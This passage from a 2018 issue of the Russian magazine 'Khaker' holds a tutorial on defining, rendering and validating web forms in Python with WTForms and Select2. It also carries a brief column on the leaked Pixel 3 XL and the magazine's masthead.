мворка aiohttp. Сути это не меняет — при меры будут работать с Flask, Sanic
или любым другим модулем. В качес тве шаб лонизатора используется Jinja2.
Устанавливаем через pip:


pip install wtforms

Проверяем версию.


import wtforms
wtforms.__version__
# '2.2.1'

Попробуем переписать форму выше на WTForms и обработать ее.


СОЗДАНИЕ ФОРМЫ
В WTForms есть ряд встроенных классов для описания форм и их полей.
Определение формы — это класс, нас ледуемый от встроенного в библиотеку
класса  Form.  Поля фор мы  описыва ются  атрибутами  класса,  каждому
из которых при создании присваивается инстанс класса поля типа, соответс‐
твующего типу поля формы. Зву чит слож но, на деле проще.


from wtforms import Form, StringField, TextAreaField, SelectField, validators
class UserForm(Form):
    first_name = StringField('First name', [validators.Length(min=5, max=30)]
)
    last_name = StringField('Last name', [validators.Length(min=5, max=30)])
    email = StringField('Email', [validators.Email()])
    password = StringField('Password')
    # meta
    gender = SelectField('Gender', coerce=int, choices=[  # cast val as int
        (0, 'Male'),
        (1, 'Female'),
    ])
    city = StringField('City')
    signature = TextAreaField('Your signature', [validators.Length(min=10,
max=4096)])

Вот что мы сделали:
 • создали класс UserForm для нашей фор мы. Он наследован от встроенно‐
   го Form (и BaseForm);
 • каждое из полей фор мы описали атри бутом клас са, присвоив объ ект
   встроенного в либу класса типа Field.

В большинстве полей формы мы использовали импортированный класс
StringField. Как нетрудно догадаться, поле gender требует ввода другого
типа — ограниченного набора зна чений (м/ж), поэтому мы использовали Se‐
lectField. Подпись пользователя тоже лучше принимать не в обычном in‐
put, а в textarea, поэто му мы исполь зовали TextAreaField, чье HTML‐
представ ление (виджет) — тег <textarea>. Если бы нам нужно было обра‐
батывать числовое значение, мы бы импорти рова ли встроенный класс Inte‐
gerField и описали бы поле им.


        WWW

                   В  WTForms  множество  встроенных  классов
                       для  описания  полей,  посмотреть  все можно
                       здесь. Также можно создать поле кастомного
                        класса.


О полях нужно знать следующее.
 1. Каждое поле может принимать набор аргу ментов, общий для всех типов
   полей.
 2. Почти каждое поле имеет HTML‐представление, так называемый вид жет.
 3. Для каждого поля мож но указать набор валида торов.
 4. Некоторые поля могут принимать дополнительные аргументы. Например,
   для SelectField можно ука зать набор воз можных значений.
 5. Поля можно добавлять к уже существу ющим формам. И можно модифи‐
   цировать, изменять значения на лету. Это осо бенно полез но, когда нужно
   чуть изменить поведение формы для одно го конкретного случая, при этом
   не создавать новый класс формы.
 6. Поля могут провоцировать ошибки валида ции по заданным правилам, они
   будут храниться в form.field.errors.


РАБОТА С ФОРМОЙ
Попробуем отобразить форму. Обычный workﬂow работы с формами состоит
из двух этапов.
 1. GET‐запрос страницы, на которой нам нужно отобразить нашу форму.
  В этот момент мы дол жны соз дать инстанс нашей формы, нас троить его,
   если потребуется, и передать шаблонизатору в контексте для рендеринга.
  Обычно это делается в обра ботчике (action) контрол лера GET‐запроса
   и чем‐то похожем в зависимос ти от HTTP‐фреймворка, которым ты поль‐
   зуешься (или не пользуешься, для WTForms это не проблема). Другими
   словами, в обработчике роута вроде GET /users/new. К слову, в Django
   или Rails ты выполняешь схожие дей ствия. В первом соз даешь такую же
  форму и передаешь ее шаблонизатору в template context, а во втором соз‐
  даешь в текущем кон тексте новый, еще не сохраненный объ ект через
   метод new (@user = User.new).
 2. POST‐запрос страницы, с которой мы должны получить данные формы
   (например, POST /users) и как‐то про цес сить: выполнить валидацию
   данных, запол нить поля объекта из формы для сохранения в БД.


Ге нерация формы (GET /users/new)
Создадим инстанс нашей предваритель но определенной формы:


user_form = UserForm()
type(user_form)
# __main__.UserForm

К каждому полю фор мы мы можем обратиться отдель но по ее атрибуту:


type(form.first_name)
# wtforms.fields.core.StringField

В самом простом случае это все. Теперь инстанс нашей формы можно
передать шаблонизатору для отображения:


def new(self, request):
    user_form = UserForm()
    render('new_user.html', {
        'form': user_form,
    })

Метод render, конечно, специфичен. В твоем случае методы рендеринга будут
определяться фреймворком и шаблониза тором, который ты используешь.
  Отлично, передали нашу форму в шаблониза тор. Как ее отренде рить
в шаблоне? Проще прос того. Напомню, что мы рассматриваем процесс
на примере Jinja2.


{{ form.first_name.label }}
{% if form.first_name.errors %}
    <ul class="errors">
        {% for error in form.first_name.errors %}
            <li>{{ error }}</li>{% endfor %}
    </ul>
{% endif %}
{{ form.first_name() }}

Код выше с user_form в качес тве form будет преобразован шаблонизатором
в следующую разметку.


<label for="first_name">First name</label>
<input id="first_name" name="first_name" type="text" value="">

Здесь происходит вот что.
 1. В первой строке мы обра тились к атрибуту label поля first_name
  нашей формы. В нем содержится HTML‐код лейбла нашего поля first_
  name. Текст берется из описания клас са формы из соответс твующего
   атрибута поля.
 2. Затем мы проверили содержимое списка errors нашего поля. Как нет‐
   рудно догадаться, в ней содержатся ошиб ки. На данный момент ошибок
   в нем нет, поэтому блок не вывел ничего. Одна ко если бы эта форма уже
   заполнялась  и  была  заполнена  неверно  (например,  валидатор
   от 6 до 30 по длине не про пус тил зна чение), то в спи сок поля попала бы
   эта ошибка. Мы увидим работу валидаторов даль ше.
 3. И наконец, в последней строке мы рендерим сам тег input, вызывая
   метод .first_name() нашего инстанса фор мы.

Все очень гибко. Мы можем рендерить все атрибуты поля или только сам тег
input. Нетрудно догадаться, что теперь мы можем сделать то же самое и для
всех остальных полей, отрендерив все поля формы или только их часть соот‐
ветствующими им встро енными HTML‐виджетами.


Парсинг пейлоада (POST /users)
Следующий шаг — получить данные формы на сервере и как‐то их обра‐
ботать. Этап состоит из нес кольких шагов.
 1. Получить POST‐данные (это может происходить по‐раз ному в зависимос‐
   ти от того, исполь зуешь ли ты фреймворк и какой конкретно, если исполь‐
   зуешь).
 2. Распарсить POST‐данные через наш инстанс формы.
 3. Проверить (валидировать) корректность заполнения. Если что‐то не так,
   вернуть ошибки.
 4. Заполнить данными фор мы требуемый объект. Это опционально, но, если
   ты пользуешься ORM, велика вероятность, что по данным формы тебе
   нужно создать объект в БД.

В нашем случае объект в БД — это пользователь, объект класса User.


async def create(self, request):
    # Получаем payload. Для aiohttp это не самый оптимальный
    # способ для больших payload. Взят для краткости
    payload = await request.post()
    # Создаем новый инстанс нашей формы и заполняем его данными,
    # пришедшими с клиента
    form = UserForm(payload)
    # Если данные с клиента проходят валидацию
    if form.validate():
        # Создаем новый объект User
        user = User()
        # Заполняем его атрибуты данными формы
        form.populate_obj(user)
        # ...
        # Сохраняем юзера в БД, редиректим дальше

Мы отрендерили форму, получили данные с клиента обратно, проверили их
и записали в БД. При этом мы не погружались во внутренности HTML, ID
полей, имена и их сопос тавления на кли енте и сервере. Не правда ли, удоб‐
но?


Опции для час тично го пар синга пей лоада
Если ты внимательно читал предыду щий раз дел, у тебя непременно возник
вопрос: а как модель поль зователя заполняется данными формы? Ведь фор‐
ма ничего не знает о полях ORM (которой может не быть). Так как же происхо‐
дит маппинг полей формы к объекту в функции populate из WTForms? Проще
всего посмотреть код этой функции.


 Signature: form.populate_obj(obj)
 Source:
     def populate_obj(self, obj):
         """
         Populates the attributes of the passed `obj`
         with data from the form's fields.
         :note: This is a destructive operation;
                Any attribute with the same name
                as a field will be overridden. Use with caution.
         """
         for name, field in iteritems(self._fields):
             field.populate_obj(obj, name)


Как видишь, функция получает список всех полей нашей формы, а затем, ите‐
рируясь по списку, присваивает атрибутам предоставленного объекта зна‐
чения.  Вдобавок  ко  всему  это  происходит  рекурсивно:  это  нужно
для полей‐контейнеров — FormFields.
  В большинстве случаев это работает отлично. Даже для полей‐ассо‐
циаций: у пользователя может быть поле, зна чением которого выступает
реляция в БД, например группа, к которой принадлежит пользователь. В этом
случае  воспользуйся  классом  wtforms.fields.SelectField,  передав
choices=[...] со списком возможных значений реляций, и на сервере
при наличии ORM это будет распознано без проблем.
  Однако иногда все‐таки нужно автомати чес ки запол нить атрибуты класса
только частью полей формы, а остальные как‐то препроцес сить. Варианта
два.
 1. Не использовать встро енную функцию populate_obj вообще и обра‐
   батывать все поля вручную, получая дос туп к ним через атрибут .data
   каждого поля фор мы вроде form.f_name.data.
 2. Написать свой метод для заполнения объекта данными формы.

Мне больше нравится второй вариант (хоть он и имеет ограничения). Нап‐
ример, так:


 from wtforms.compat import iteritems, itervalues, with_metaclass
 def populate_selective(form, obj, exclude=[]):
     for name, field in filter(lambda f: f[0] not in exclude, iteritems(form
 ._fields)):
         field.populate_obj(obj, name)


Теперь можно использовать из формы только те поля, которые нужны:


 populate_selective(form, user, exclude=['f_name', 'l_name', 'city',])


А с остальными разбираться по собственной логике.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ

  ИДЕАЛЬНАЯ ФОРМА
                ОБРАБАТЫВАЕМ СЛОЖНЫЕ ФОРМЫ
                НА PYTHON С ПОМОЩЬЮ WTFORMS





Валидаторы
Еще один вопрос, ответ на который ты наверняка уже понял по контексту:
как работает функция form.validate()? Она проверяет как раз те самые
списки валидаторов с параметрами, которые мы ука зывали при определении
класса формы. Давай поп робуем позаполнять раз личные значения в стро‐
ковых полях, которые в реальном приложении в нашу форму будет предос‐
тавлять с клиента поль зователь, и пос мотрим, как среагирует валидатор.


form = UserForm()
form.first_name.data = 'Johnny'
form.last_name.data = 'Doe'
form.email.data = 'invalid_email'
form.password.data = 'super‐secret‐pass'

Попробуем валидировать эту форму.


form.validate()
# False

Валидация не прошла. Ты помнишь, что в каждом поле есть список errors,
который будет содержать ошиб ки, если они произой дут при заполнении фор‐
мы. Посмотрим на них.


form.first_name.errors
# []

Все правильно, в первом поле ошибок не было, список валидаторов [val‐
idators.Length(min=5, max=30)] пройден, так как имя Johnny удовлетво‐
ряет единственному валида тору. Посмотрим дру гие.


form.last_name.errors
# ['Field must be between 5 and 30 characters long.']
form.email.errors
# ['Invalid email address.']
form.password.errors
# []

Во втором и третьем случаях сработали валидаторы, а наш шаблон (ниже)
выведет список ошибок.


{% if form.first_name.errors %}
    <ul class="errors">
        {% for error in form.first_name.errors %}
            <li>{{ error }}</li>{% endfor %}
    </ul>
{% endif %}


             INFO

                      Разумеется, чтобы все сработало, для повторно го
                       дозаполнения формы  тебе  нужно  переда вать
                      этот же самый инстанс формы в шаблонизатор,
                       а не создавать новый. Кроме списка ошибок, он
                        будет содержать предзаполненные поля с пре‐
                     дыдущей попытки, так что пользователю не при‐
                        дется вводить все по новой.


С полным списком встроенных валида торов мож но ознакомиться здесь,
а если их не хватит, то WTForms позволя ет определить и собственные.


ДИНАМИЧЕСКОЕ ИЗМЕНЕНИЕ СВОЙСТВ ПОЛЕЙ ФОРМЫ
Ты уже знаешь, что у полей формы есть набор общих атри бутов, которые
можно указать у всех классов полей. Например, описание, которое идет пер‐
вым позиционным аргументом в любом поле. Дру гие примеры:
 • id — атрибут ID HTML‐виджета при рендерин ге;
 • name — имя виджета (свой ство name в HTML), по которому будет делаться
   сопоставление;
 • ошибки, валидаторы и так далее.

Все это возможно бла годаря тому, что все классы полей наследуются
от базового класса wtforms.ﬁelds.Field.
  Однако случаи бывают разные. Иног да в уже определенной форме может
понадобиться поменять зна чение полей. Например,
 • установить дефол тное зна чение в одном из строковых полей;
 • добавить для другого поля класс при рендерин ге (потому что одна и та же
  форма используется во многих мес тах в приложении и в этом нужен осо‐
  бый класс);
 • для третьего поля —ука зать data‐атрибут для клиентского кода, содер‐
  жащий API‐endpoint для динамичес кого фет чинга данных.

Все эти моменты лучше настра ивать пря мо перед самым рендерингом фор‐
мы у готового инстанса формы: совершенно незачем тащить это в определе‐
ние класса. Но как это сделать? Вспом ним, что наша форма — это обычный
Python‐объект и мы можем управлять его атри бута ми!
  Зададим дефол тное зна чение поля first_name (другой вариант — через
default):


form.first_name.data = 'Linus'

У поля любого класса есть сло варь render_kw. Он предоставляет список
атрибутов, которые будут отрендерены в HTML‐теге (виджете).


# Теперь поле хорошо выглядит с Bootstrap!
form.last_name.render_kw['class'] = 'form‐control'

Ну и зададим кастомный data‐атрибут для проверки на дублирование акка‐
унта:


form.users.render_kw['data‐url'] = request.app.router['api_users_search'].
url_for()


СБОРНЫЕ И НАСЛЕДУЕМЫЕ ФОРМЫ
В самом начале статьи мы говорили, что одна и та же форма может исполь‐
зоваться в разных ситуациях. Обычно мы выносим описание формы в отдель‐
ный модуль, а затем его импортируем. Но в одном случае у нас дол жен быть
только минимальный набор полей (атрибутов) формы, а в дру гом — рас‐
ширенный. Избежать дуб лирова ния определений классов форм нам поможет
их наследование.
  Определим базовый класс формы:


class UserBaseForm(Form):
    email = StringField('Email', [validators.Email()])
    password = StringField('Password')

В нем будут только те поля, которые необ ходимы для создания пользователь‐
ского аккаунта. А затем определим расширенный, который будет нас‐
ледоваться от базового:


class UserExtendedForm(UserBaseForm):
    first_name = StringField('First name', [validators.Length(min=4, max=25)]
)
    last_name = StringField('Last name', [validators.Length(min=4, max=25)])

Создадим две формы и пос мотрим, какие поля у них есть.


base_form = UserBaseForm()
base_form._fields
# OrderedDict([('email', <wtforms.fields.core.StringField at 0x106b1df60>),
# ('password', <wtforms.fields.core.StringField at 0x106b1d630>)])

А теперь посмотрим, что содержит наша рас ширенная форма:


extended_from = UserExtendedForm()
extended_from._fields
# OrderedDict([('email', <wtforms.fields.core.StringField at 0x106b12a58>),
# ('password', <wtforms.fields.core.StringField at 0x106b12f60>),
# ('first_name', <wtforms.fields.core.StringField at 0x106b12e80>),
# ('last_name', <wtforms.fields.core.StringField at 0x106b12ef0>)])

Как видишь, она содержит не только описанные поля, но и те, которые были
определены в базовом клас се. Таким образом, мы можем создавать сложные
формы, наследуя их друг от дру га, и использовать в текущем контроллере ту,
которая нам в данный момент необ ходима.
  Другой способ создания сложных форм — уже упомяну тый FormField.
Это отдельный класс поля, который может нас ледовать уже сущес твующий
класс формы. Например, вместе с Post можно соз дать и нового User для это‐
го поста, префиксив названия полей.


ЗАПОЛНЕНИЕ РЕЛЯЦИОННЫХ ПОЛЕЙ (ONE-TO-MANY, MANY-TO-
MANY)
Одна (не)большая проб лема при постро ении форм — это реляции. Они отли‐
чаются от обычных полей тем, что их представление в БД не соответствует as
is тому, что должно отоб ражаться в поле формы, а при сохранении они могут
требовать преп роцессинга. И эту проб лему легко решить с WTForms. Пос‐
кольку мы знаем, что поля формы можно изменять динамически, почему бы
не использовать это свойство для ее предзаполнения объектами в нужном
формате?
   Разберем простой пример: у нас есть форма соз дания пос та и для него
нужно указать категорию и список авторов. Категория у поста всегда одна,
а авторов может быть несколько. Кстати, схожий способ используется прямо
на Xakep.ru (я использую WTForms на бэкенде «Хакера», PHP с WP у нас толь‐
ко в публичной части).
  Отображать реляции в форме мы можем дву мя способами.
 1. В обычном <select>, который будет отрендерен как выпадающий спи‐
   сок. Этот способ подходит, ког да у нас мало воз можных значений. Нап‐
   ример, список категорий поста — их не более дюжины, включая скрытые.
 2. В динамически подгру жаемом списке, аналогичном списку тегов, которые
   ты встречаешь на дру гих сайтах. Для реализации его нам поможет прос той
   трюк.

В первом варианте у нашей формы есть поле category, в базе оно соответс‐
твует полю category_id. Что бы отрендерить это поле в шаб лоне как select,
мы должны создать у формы атрибут category класса SelectField. При рен‐
деринге в него нужно передать список из возможных значений, который фор‐
мируется запросом в БД (читай: список воз можных категорий для пос та),
а также установить дефолтное зна чение.


# Импортируем хелпер шаблонов, который представляет объект Category
# как строку в нужном формате, аналог __str__. Нужно для удобства
from admin.template_helpers.categories import humanize_category
# Выберем все категории из БД
categories = Category.select().all()
# Установим дефолтное значение первой из них
form.categories.data = [str(categories[0].id)]
# Передадим список всех возможных вариантов для SelectField
# В шаблоне отрендерится <select> c выбранным указанным <option>
# Формат — список кортежей вида (<идентификатор>, <человекочитаемое
представление>)
form.categories.choices = [(c.id, humanize_category(c)) for c in categories]

В результате у поля спис ка появятся предзаполненные значения.





   Предзаполненный select с уста новленным зна чением через WTForms

С авторами постов (пользователями) или журналами такой трюк не прой дет.
Первых у нас около ста тысяч, и, разумеется, ни рендерить, ни искать в таком
гигантском select’е будет невоз можно. Один из вари антов решения задачи —
использовать библиотеку Select2. Она позволяет превратить любой input
в динамически подгружаемый список а‐ля список тегов простым прис‐
воением нужного класса, а данные подгружать по предоставленному URL. Мы
уже умеем делать это через знакомый словарь render_kw.


form.issues.render_kw['class'] = 'live_multiselect'
form.issues.render_kw['data‐url'] = request.app.router['api_issues_search'].
url_for()

А дальше простым добавлением в шаб лон jQuery‐функции превращаем все
input c нужным классом в динамичес ки подгружаемые селекторы (обработчик
поиска, разумеется, дол жен быть на сервере):


$(".live_multiselect").each(function (index) {
    let url = $(this).data('url')
    let placeholder = $(this).data('placeholder')
    $(this).select2({
        tags: true,
        placeholder: placeholder,
        minimumInputLength: 3,
        ajax: {
            url: url,
            delay: 1000,
            dataType: 'json',
            processResults: function (data) {
                let querySet = { results: data };
                return querySet
            }
        }
    });
});

В результате получаем удобный переиспользуемый виджет.





   Динамически подгру жаемый селектор средства ми WTForms и Select2


Кастомные вид жеты и расширения
Пример выше может показаться частным, однако он подводит к важной проб‐
леме. Хорошо, что наша задача реша ется плагином Select2, который поз‐
воляет буквально добавлением одного класса и щепотки JS получить необ‐
ходимую функциональность. Одна ко как быть, если нам нужен полностью
собственный шаблон для поля или даже полностью свое сложное поле с кас‐
томным шаблоном, поведением и валида торами?
  К счастью, WTForms позволяет соз давать нам собственные виджеты (клас‐
сы‐генераторы HTML‐шаб лонов для рендерин га полей). Мы можем сделать
это двумя способами:
 1. Создать собственный на базе существующего (class CustomWidget(
  TextInput): ...), расширив его поведение и переопределив методы,
   вклю чая __call__. Нап ример, обернуть в дополнительный HTML‐шаблон.
 2. Создать полностью собственный виджет, не наследуясь от сущес твующих
   встроенных.

Список встроенных виджетов можно найти здесь, рекомендации и пример
полностью кастомного также присутс твуют в документации.
  Интегрировать собственный виджет тоже несложно. У каждого поля есть
атрибут widget. Мы можем указать наш виджет в качестве этого keyword‐
аргумента при определении поля в клас се формы или, если кастомный вид‐
жет нужен не всегда, присваивать его полю динамически.
  Кроме кастомных виджетов, мы можем создавать полностью кастомные
поля. Примером такого поля служит расширение WTForms‐JSON, которое
пригодится для обработки JSON‐полей моделей. Определить собственное
поле также возможно, соответс тву ющий пример ты найдешь в документации.


ВМЕСТО ЗАКЛЮЧЕНИЯ
Возможно, после прочтения этой статьи тебе показа лось, что отдельная биб‐
лиотека для генерации и обслуживания HTML‐форм — ненужное усложнение.
И будешь прав, когда речь идет о небольших приложениях.
  Однако, когда тебе нужно обра батывать десяток сложных форм, часть
из них переиспользовать и формировать динами чес ки, декларативный спо‐
соб описания полей и правил их парсинга поз воляет не запутаться в бес‐
конечной лапше имен и ID‐шников и избавиться от монотонного тру да,
переложив написание шаблонного кода с прог раммиста на библиотеку. Сог‐
ласись, это же круто. :)
 GEEK
   PIXEL 3
     Олег Афонин
  Эксперт по мобильной
криминалистике компании
      «Элкомсофт»
aoleg@voicecallcentral.com      НЕНАСТОЯЩИЙ?

                          КОЛОНКА
                              ОЛЕГА
                        АФОНИНА





 По сообщениям прессы, Google связалась с обозревате‐
 лями гаджетов на YouTube, которые кри тиковали еще не
 анонсированный смартфон компании Pixel 3 XL на основе
 утекших экземпляров устройства. Вопреки ожиданиям, ком‐
 пания не потребовала удалить спорные ролики, а попросила
 разрешения ис пользовать части видео, в которых обоз‐
 реватель в пух и прах разносит так называемую «моноб‐
 ровь» — вырез в верхней части устройства. Что это значит?


 Напомним хроноло гию развития событий (более подробно о ней можно
  почитать в статье «Утечка Google Pixel 3 XL: расследование, хронология
  и комментарии участников события»).
   В начале августа появи лась первая информа ция о Pixel 3 XL. Неизвестный
  доброжелатель бесплатно отправил устройства сразу нескольким популяр‐
 ным обозревателям и видеобло герам. Было разослано довольно много
  устройств, счет шел на десятки экземпляров. Железо, софт, упаковка — все
  указывало на то, что это нас тоящие аппараты. К концу месяца обзор еще не
 вышедшего Pixel 3 XL не написал, пожалуй, толь ко ленивый. Самые смелые
  обозреватели даже выложили видеообзоры на принадлежащий Google сер‐
  вис YouTube.
    Вот так выглядит устройство, полученное обоз ревателями.





  Большинство подвергло рез кой критике «моноб ровь» устройства.





 Вырез на полученных обозревателями экземпля рах оказался чрезвычайно
  глубоким и неэстетичным.





 Неужели дизайнеры Google и вся команда разработ чиков HTC не смогли при‐
  думать ничего луч ше очередного кло на iPhone X? Может, и так. Однако есть
  нестыковка: в коде Android 9 для Pixel 2 XL найдены изображения устройства,
  в котором нет и намека на вырез.





 Более того, при настройке Pixel 2 XL на Android 9 пользователи видят сле‐
 дующее изображение.





 Почему такая нестыковка и зачем, в конце концов, виде ообзоры с критикой
  «моноброви» в утечках Pixel 3 XL понадо бились Google?
    До обращения Google к обозревателям воп рос вставал, по сути, один:
  была ли столь массовая утечка спланирована компанией, или же предрелиз‐
  ную партию Pixel 3 XL укра ли с завода? Сомнений в том, что именно эта
  модель и именно в таком виде пойдет в про дажу, у обоз ревате лей не воз‐
  никало. После обращения Google к видеоблогерам добавилось еще как
 минимум два возможных варианта.
   Вариант первый: «утек» один из тех прототипов, которые создаются
  в рамках процесса разработки, но не выходят в свет из‐за обнаруженных
  недостатков в реальном использовании. Мно гочисленные прототипы —
  обычная практика разработки устройств. Так поступают практически все ком‐
  пании. Вот, нап ример, фотография прототипов смартфона OnePlus 5, опуб‐
  ликованная самой OnePlus.





 Прототипы раздаются пользователям (как пра вило — работникам компании),
  которые пытаются оце нить дос тоинства и недос татки дизайна при исполь‐
  зовании. В рамках этой теории можно рассматривать вероятность и случай‐
  ной утечки, и намеренно допущен ного, контролируемого слива информации
  как запланированной «вирусной» маркетин говой кампании. Если окажется,
  что окончательный вариант Pixel 3 XL будет без выреза, то критика «моноб‐
  рови» может быть использована Google при анонсе Pixel 3 XL, который наз‐
  начен на 9 октября.
   Вариант вто рой: все та же параллельная раз работка, в которой тес тиру‐
  ются варианты как с вырезом, так и без него. Руководство склоняется к тому,
  чтобы принять вариант с «монобровью». Команда, которая проекти рует
  устройство без выреза, допускает контролируемую утечку варианта кон‐
  курирующей команды, пос ле  чего демонс трирует начальству массовый
  негатив и критику выреза со стороны обозревателей и комментаторов. Вари‐
  ант без выреза получа ет зеленый свет, а утечку решают использовать
  в качестве маркетингового хода.
    Что именно нас ожидает на презентации 9 октября? Какой вариант Pixel 3
  XL представит Google? Пожалуй, впервые за все время существования
  линейки Pixel появилась интрига.
   №09 (234)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Главный редактор       Выпускающий редактор         Шеф‐редактор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
                  aLLy              Евгений Зобнин        Антон «ant» Жуков
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018